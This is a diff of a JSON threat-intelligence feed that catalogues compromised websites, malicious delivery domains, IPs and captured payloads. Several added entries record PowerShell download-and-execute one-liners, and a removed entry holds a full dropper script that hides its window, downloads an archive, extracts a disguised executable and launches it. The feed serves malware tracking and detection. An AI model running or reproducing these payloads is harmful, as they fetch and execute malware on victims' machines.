@@ -1,5 +1,81 @@
 [
   {
+    "UrlDomain": "gruendlers.com.tr",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/33a0fd33ff31f556"
+    ],
+    "IP": [
+      "91.151.82.191"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/33a0fd33ff31f556')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/33a0fd33ff31f556"
+    ],
+    "ReportId": "cmwmngqk01tqp0omlslirqrdy",
+    "ScannedAt": "2026-11-18T21:45:12.567000+00:00"
+  },
+  {
+    "UrlDomain": "daithangfood.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72a22e04bfde613c"
+    ],
+    "IP": [
+      "103.28.39.9"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/72a22e04bfde613c')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/72a22e04bfde613c"
+    ],
+    "ReportId": "cmwmngbn11tq10omlskwnk4t3",
+    "ScannedAt": "2026-11-18T21:44:53.281000+00:00"
+  },
+  {
+    "UrlDomain": "delhidda.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/51465b6b04dc16ac"
+    ],
+    "IP": [
+      "104.21.21.212"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/51465b6b04dc16ac')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/51465b6b04dc16ac"
+    ],
+    "ReportId": "cmwmnfqnc1tp70oml3we4437f",
+    "ScannedAt": "2026-11-18T21:44:26.079000+00:00"
+  },
+  {
+    "UrlDomain": "asiancon.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/723cf4360f5743be"
+    ],
+    "IP": [
+      "5.189.171.100"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/723cf4360f5743be')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/723cf4360f5743be"
+    ],
+    "ReportId": "cmwmnff871tna0omlqrlqhndl",
+    "ScannedAt": "2026-11-18T21:44:11.264000+00:00"
+  },
+  {
     "UrlDomain": "camptasticrentals.com",
     "DeliveryUrl": [
       "baseupdate2798.com"
@@ -5525,24 +5601,5 @@
     ],
     "ReportId": "cmwjtkxy018zw0omloccp4asm",
     "ScannedAt": "2026-11-16T22:13:07.976000+00:00"
-  },
-  {
-    "UrlDomain": "modderguys.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "104.207.79.43"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwjslc4f18z40omlmg91ed88",
-    "ScannedAt": "2026-11-16T21:45:26.759000+00:00"
   }
 ]
